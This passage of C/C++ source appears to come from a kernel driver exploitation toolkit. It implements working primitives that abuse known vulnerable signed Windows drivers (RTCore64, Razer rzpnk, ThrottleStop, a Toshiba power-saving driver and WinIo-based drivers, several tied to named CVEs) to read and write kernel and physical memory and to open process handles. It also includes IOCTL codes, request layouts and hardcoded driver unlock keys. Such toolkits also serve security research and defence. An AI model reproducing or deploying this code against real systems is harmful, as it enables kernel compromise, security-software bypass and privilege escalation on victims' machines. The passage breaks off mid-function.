* RTCoreWriteMemoryULONG64
*
* Purpose:
*
* Write ULONG64 to kernel.
*
*/
BOOL RTCoreWriteMemoryULONG64(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG64 Value)
{
    if (RTCoreWriteMemoryPrimitive(DeviceHandle,
        sizeof(ULONG),
        Address,
        Value & 0xfffffffful))
    {
        return RTCoreWriteMemoryPrimitive(DeviceHandle,
            sizeof(ULONG),
            Address + sizeof(ULONG),
            Value >> 32);
    }

    return FALSE;
}

/*
* RTCoreReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via RTCore64.
* Input buffer length must be aligned to ULONG
*
*/
_Success_(return != FALSE)
BOOL WINAPI RTCoreReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    if ((NumberOfBytes % sizeof(ULONG)) != 0)
        return FALSE;

    PULONG BufferPtr = (PULONG)Buffer;

    ULONG_PTR virtAddress = VirtualAddress;
    ULONG valueRead, readBytes = 0;

    for (ULONG i = 0; i < (NumberOfBytes / sizeof(ULONG)); i++) {

        if (!RTCoreReadMemoryULONG(DeviceHandle, virtAddress, &valueRead))
            break;

        BufferPtr[i] = valueRead;
        virtAddress += sizeof(ULONG);
        readBytes += sizeof(ULONG);
    }

    return (readBytes == NumberOfBytes);
}

/*
* RTCoreWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via RTCore64.
* Input buffer length must be aligned to ULONG
*
*/
_Success_(return != FALSE)
BOOL WINAPI RTCoreWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    if ((NumberOfBytes % sizeof(ULONG)) != 0)
        return FALSE;

    PULONG BufferPtr = (PULONG)Buffer;

    ULONG_PTR virtAddress = VirtualAddress;
    ULONG valueWrite, writeBytes = 0;

    for (ULONG i = 0; i < (NumberOfBytes / sizeof(ULONG)); i++) {

        valueWrite = BufferPtr[i];
        if (!RTCoreWriteMemoryULONG(DeviceHandle, virtAddress, valueWrite))
            break;

        virtAddress += sizeof(ULONG);
        writeBytes += sizeof(ULONG);
    }

    return (writeBytes == NumberOfBytes);
}

```

`Source/Hamakaze/idrv/rtcore.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       RTCORE.H
*
*  VERSION:     1.10
*
*  DATE:        15 Apr 2021
*
*  RTCore64 driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// RTCore64 driver interface for CVE-2019-16098.
//

#define RTCORE_DEVICE_TYPE      (DWORD)0x8000

#define RTCORE_FUNCTION_READMSR (DWORD)0x80C
#define RTCORE_FUNCTION_READVM  (DWORD)0x812
#define RTCORE_FUNCTION_WRITEVM (DWORD)0x813

#define IOCTL_RTCORE_READMSR    \
    CTL_CODE(RTCORE_DEVICE_TYPE, RTCORE_FUNCTION_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002030

#define IOCTL_RTCORE_READVM     \
    CTL_CODE(RTCORE_DEVICE_TYPE, RTCORE_FUNCTION_READVM, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002048

#define IOCTL_RTCORE_WRITEVM    \
    CTL_CODE(RTCORE_DEVICE_TYPE, RTCORE_FUNCTION_WRITEVM, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x8000204C

typedef struct _RTCORE_REQUEST {
    ULONG_PTR Unknown0;
    ULONG_PTR Address;
    ULONG_PTR Unknown1;
    ULONG Size;
    ULONG Value;
    ULONG_PTR Unknown2;
    ULONG_PTR Unknown3;
} RTCORE_REQUEST, * PRTCORE_REQUEST;

typedef struct _RTCORE_MSR {
    ULONG Register;
    ULONG ValueHigh;
    ULONG ValueLow;
} RTCORE_MSR, * PRTCORE_MSR;

BOOL WINAPI RTCoreReadMsr(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG Msr,
    _Out_ ULONG64* Value);

_Success_(return != FALSE)
BOOL WINAPI RTCoreReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI RTCoreWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/rzpnk.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       RZPNK.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Razer Overlay Support driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/rzpnk.h"

//
// Based on CVE-2017-9769.
//

/*
* RazerOpenProcess
*
* Purpose:
*
* Call ZwOpenProcess via razer driver request.
*
*/
BOOL WINAPI RazerOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    BOOL bResult;
    RAZER_OPEN_PROCESS request;

    UNREFERENCED_PARAMETER(DesiredAccess);

    request.ProcessId = ProcessId;
    request.ProcessHandle = NULL;

    bResult = supCallDriver(DeviceHandle,
        IOCTL_RZPNK_OPEN_PROCESS,
        &request,
        sizeof(request),
        &request,
        sizeof(request));

    *ProcessHandle = request.ProcessHandle;
    return bResult;
}

```

`Source/Hamakaze/idrv/rzpnk.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       RZPNK.H
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Razer Overlay Support driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Razer Overlay Support driver interface for CVE-2017-9769.
//

#define RAZER_DEVICE_TYPE FILE_DEVICE_UNKNOWN

#define RAZER_OPEN_PROCESS_FUNCID   (DWORD)0x814

#define IOCTL_RZPNK_OPEN_PROCESS    \
    CTL_CODE(RAZER_DEVICE_TYPE, RAZER_OPEN_PROCESS_FUNCID, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0x22A050

typedef struct _RAZER_OPEN_PROCESS {
    HANDLE ProcessId;
    HANDLE ProcessHandle;
} RAZER_OPEN_PROCESS, * PRAZER_OPEN_PROCESS;

BOOL WINAPI RazerOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

```

`Source/Hamakaze/idrv/tpup.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       TPUP.CPP
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  TechPowerUp ThrottleStop driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/tpup.h"

static SUPERFETCH_MEMORY_MAP g_TpupMemoryMap = { 0 };
static BOOL g_TpupMemoryMapInitialized = FALSE;

/*
* TpupEnsureMemoryMap
*
* Purpose:
*
* Initialize memory map (once). Only for stable memory layout, otherwise rebuild the map.
*
*/
BOOL TpupEnsureMemoryMap(VOID)
{
    if (g_TpupMemoryMapInitialized)
        return TRUE;

    if (!supBuildSuperfetchMemoryMap(&g_TpupMemoryMap))
        return FALSE;

    g_TpupMemoryMapInitialized = TRUE;

    supPrintfEvent(kduEventInformation,
        "[+] Superfetch memory map built: %llu entries from %lu ranges\r\n",
        g_TpupMemoryMap.TableSize,
        g_TpupMemoryMap.RangeCount);

    return TRUE;
}

/*
* TpupReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory via ThrottleStop driver.
*
*/
BOOL TpupReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite)
{
    NTSTATUS ntStatus;
    ULONG chunkSize;
    ULONG ioctl;
    ULONG_PTR offset = 0;
    UCHAR inputBuffer[16];
    UCHAR outputBuffer[8];
    IO_STATUS_BLOCK ioStatus;

    if (NumberOfBytes == 0 || Buffer == NULL)
        return FALSE;

    ioctl = DoWrite ? IOCTL_TPUP_WRITE_PHYSICAL_MEMORY : IOCTL_TPUP_READ_PHYSICAL_MEMORY;

    while (offset < NumberOfBytes) {

        chunkSize = NumberOfBytes - (ULONG)offset;
        if (chunkSize > TPUP_MAX_CHUNK_SIZE)
            chunkSize = TPUP_MAX_CHUNK_SIZE;

        RtlSecureZeroMemory(inputBuffer, sizeof(inputBuffer));
        RtlSecureZeroMemory(outputBuffer, sizeof(outputBuffer));

        *(PULONG64)inputBuffer = PhysicalAddress + offset;

        if (DoWrite) {

            RtlCopyMemory(&inputBuffer[8], RtlOffsetToPointer(Buffer, offset), chunkSize);

            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                inputBuffer,
                8 + chunkSize,
                NULL,
                0,
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;
        }
        else {

            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                inputBuffer,
                sizeof(ULONG64),
                outputBuffer,
                chunkSize,
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;

            if (ioStatus.Information != chunkSize)
                return FALSE;

            RtlCopyMemory(RtlOffsetToPointer(Buffer, offset), outputBuffer, chunkSize);
        }

        offset += chunkSize;
    }

    return TRUE;
}

/*
* TpupReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory via ThrottleStop driver.
*
*/
BOOL WINAPI TpupReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpupReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* TpupWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory via ThrottleStop driver.
*
*/
BOOL WINAPI TpupWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpupReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* TpupReadKernelVirtualMemory
*
* Purpose:
*
* Read kernel virtual memory via ThrottleStop using Superfetch translation.
*
*/
BOOL WINAPI TpupReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToRead;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE destBuffer;

    if (!TpupEnsureMemoryMap())
        return FALSE;

    destBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpupMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToRead = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToRead > bytesRemaining)
            bytesToRead = bytesRemaining;

        if (!TpupReadPhysicalMemory(DeviceHandle, currentPA, destBuffer + offset, bytesToRead))
            return FALSE;

        currentVA += bytesToRead;
        offset += bytesToRead;
        bytesRemaining -= bytesToRead;
    }

    return TRUE;
}

/*
* TpupWriteKernelVirtualMemory
*
* Purpose:
*
* Write kernel virtual memory via ThrottleStop using Superfetch translation.
*
*/
BOOL WINAPI TpupWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToWrite;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE srcBuffer;

    if (!TpupEnsureMemoryMap())
        return FALSE;

    srcBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpupMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToWrite = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToWrite > bytesRemaining)
            bytesToWrite = bytesRemaining;

        if (!TpupWritePhysicalMemory(DeviceHandle, currentPA, srcBuffer + offset, bytesToWrite))
            return FALSE;

        currentVA += bytesToWrite;
        offset += bytesToWrite;
        bytesRemaining -= bytesToWrite;
    }

    return TRUE;
}

/*
* TpupValidatePrerequisites
*
* Purpose:
*
* Check if Superfetch is available and build memory map.
*
*/
BOOL WINAPI TpupValidatePrerequisites(
    _In_ PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    NTSTATUS ntStatus;

    UNREFERENCED_PARAMETER(Context);

    //
    // Only enable privilege, defer map building
    //
    ntStatus = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
    if (!NT_SUCCESS(ntStatus)) {
        supPrintfEvent(kduEventError,
            "[-] Failed to enable SE_PROF_SINGLE_PROCESS_PRIVILEGE (0x%lX)\r\n", ntStatus);
        return FALSE;
    }

    supPrintfEvent(kduEventInformation,
        "[+] Superfetch prerequisites validated\r\n");

    return TRUE;
}

/*
* TpupFreeResources
*
* Purpose:
*
* Free provider resources (memory map).
*
*/
VOID TpupFreeResources(VOID)
{
    supFreeSuperfetchMemoryMap(&g_TpupMemoryMap);
}

```

`Source/Hamakaze/idrv/tpup.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       TPUP.H
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  TechPowerUp ThrottleStop driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// TechPowerUp ThrottleStop driver interface. 
// CVE-2025-7771
//

#define TPUP_DEVICE_TYPE        (DWORD)0x8000

#define IOCTL_TPUP_READ_PHYSICAL_MEMORY     \
    CTL_CODE(TPUP_DEVICE_TYPE, 0x1926, METHOD_BUFFERED, FILE_ANY_ACCESS)  // 0x80006498

#define IOCTL_TPUP_WRITE_PHYSICAL_MEMORY    \
    CTL_CODE(TPUP_DEVICE_TYPE, 0x1927, METHOD_BUFFERED, FILE_ANY_ACCESS)  // 0x8000649C

#define TPUP_MAX_CHUNK_SIZE     8

BOOL WINAPI TpupReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupValidatePrerequisites(
    _In_ PKDU_CONTEXT Context);

```

`Source/Hamakaze/idrv/tpw.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       TPW.CPP
*
*  VERSION:     1.45
*
*  DATE:        16 Dec 2025
*
*  TOSHIBA laptop power saving driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/tpw.h"

static SUPERFETCH_MEMORY_MAP g_TpwMemoryMap = { 0 };
static BOOL g_TpwMemoryMapInitialized = FALSE;

/*
* TpwEnsureMemoryMap
*
* Purpose:
*
* Initialize memory map (once). Only for stable memory layout, otherwise rebuild the map.
*
*/
BOOL TpwEnsureMemoryMap(VOID)
{
    if (g_TpwMemoryMapInitialized)
        return TRUE;

    if (!supBuildSuperfetchMemoryMap(&g_TpwMemoryMap))
        return FALSE;

    g_TpwMemoryMapInitialized = TRUE;

    supPrintfEvent(kduEventInformation,
        "[+] Superfetch memory map built: %llu entries from %lu ranges\r\n",
        g_TpwMemoryMap.TableSize,
        g_TpwMemoryMap.RangeCount);

    return TRUE;
}

/*
* TpwReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory via TPwSav driver.
*
*/
BOOL TpwReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite)
{
    NTSTATUS ntStatus;
    ULONG ioctl;
    LARGE_INTEGER buffer[2];
    IO_STATUS_BLOCK ioStatus;

    if (NumberOfBytes == 0 || Buffer == NULL)
        return FALSE;

    ioctl = DoWrite ? IOCTL_TPW_WRITE_PHYSICAL_MEMORY : IOCTL_TPW_READ_PHYSICAL_MEMORY;
    PBYTE pBuffer = (PBYTE)Buffer;
    for (ULONG i = 0; i < NumberOfBytes; i++) {
        RtlSecureZeroMemory(buffer, sizeof(buffer));
        buffer[0].QuadPart = (ULONG_PTR)(PhysicalAddress + i);
        buffer[1].QuadPart = 0;
        
        if (DoWrite) {
            buffer[1].QuadPart = pBuffer[i];

            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                buffer,
                sizeof(buffer),
                NULL,
                0,
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;
        }
        else {
            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                buffer,
                sizeof(buffer),
                buffer,
                sizeof(buffer),
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;

            pBuffer[i] = (BYTE)(buffer[1].LowPart & 0xFF);
        }
    }

    return TRUE;
}

/*
* TpwReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory via TPwSav driver.
*
*/
BOOL WINAPI TpwReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpwReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* TpwWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory via TPwSav driver.
*
*/
BOOL WINAPI TpwWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpwReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* TpwReadKernelVirtualMemory
*
* Purpose:
*
* Read kernel virtual memory via TPwSav driver using Superfetch translation.
*
*/
BOOL WINAPI TpwReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToRead;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE destBuffer;

    if (!TpwEnsureMemoryMap())
        return FALSE;

    destBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpwMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToRead = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToRead > bytesRemaining)
            bytesToRead = bytesRemaining;

        if (!TpwReadPhysicalMemory(DeviceHandle, currentPA, destBuffer + offset, bytesToRead))
            return FALSE;

        currentVA += bytesToRead;
        offset += bytesToRead;
        bytesRemaining -= bytesToRead;
    }

    return TRUE;
}

/*
* TpwWriteKernelVirtualMemory
*
* Purpose:
*
* Write kernel virtual memory via TPwSav using Superfetch translation.
*
*/
BOOL WINAPI TpwWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToWrite;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE srcBuffer;

    if (!TpwEnsureMemoryMap())
        return FALSE;

    srcBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpwMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToWrite = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToWrite > bytesRemaining)
            bytesToWrite = bytesRemaining;

        if (!TpwWritePhysicalMemory(DeviceHandle, currentPA, srcBuffer + offset, bytesToWrite))
            return FALSE;

        currentVA += bytesToWrite;
        offset += bytesToWrite;
        bytesRemaining -= bytesToWrite;
    }

    return TRUE;
}

/*
* TpwFreeResources
*
* Purpose:
*
* Free provider resources (memory map).
*
*/
VOID TpwFreeResources(VOID)
{
    supFreeSuperfetchMemoryMap(&g_TpwMemoryMap);
}

```

`Source/Hamakaze/idrv/tpw.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       TPW.H
*
*  VERSION:     1.45
*
*  DATE:        16 Dec 2025
*
*  TOSHIBA laptop power saving driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// TOSHIBA laptop power saving driver interface header.
//

#define IOCTL_TPW_READ_PHYSICAL_MEMORY     \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x832, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_TPW_WRITE_PHYSICAL_MEMORY    \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x833, METHOD_BUFFERED, FILE_ANY_ACCESS)

BOOL WINAPI TpwReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpwWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpwReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpwWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/winio.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       WINIO.CPP
*
*  VERSION:     1.41
*
*  DATE:        02 Dec 2023
*
*  WINIO based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/winio.h"
#include "ldrsc.h"

#ifdef __cplusplus
extern "C" {
#include "../Shared/thirdparty/tinyaes/aes.h"
}
#endif

//
// AES keys used by EneTechIo latest variants.
//
static ULONG g_EneTechIoUnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };
static ULONG g_EneTechIoUnlockKey2[4] = { 0x9984FD3E, 0x70683A8, 0xBD444418, 0x5E10D83 };

ULONG g_WinIoMapIOCTL;
ULONG g_WinIoUnmapIOCTL;

//
// Generic WINIO interface for all supported drivers based on WINIO code.
//
// MICSYS RGB driver interface for CVE-2019-18845.
// Ptolemy Tech Co., Ltd ENE driver interface
// G.Skill EneIo64 driver interface
// ASUS GPU Tweak driver interface
// ... and multiple others
//

typedef PVOID(WINAPI* pfnWinIoGenericMapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject);

typedef VOID(WINAPI* pfnWinIoGenericUnmapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject);

PUCHAR g_pvAESKey;
pfnWinIoGenericMapMemory g_WinIoMapMemoryRoutine;
pfnWinIoGenericUnmapMemory g_WinIoUnmapMemoryRoutine;

BOOL g_PhysAddress64bit = FALSE;
BOOL g_SpecifyOffset = FALSE;

/*
* MsIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MsIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = PhysicalAddress + NumberOfBytes;

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* MsIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MsIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID WinIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
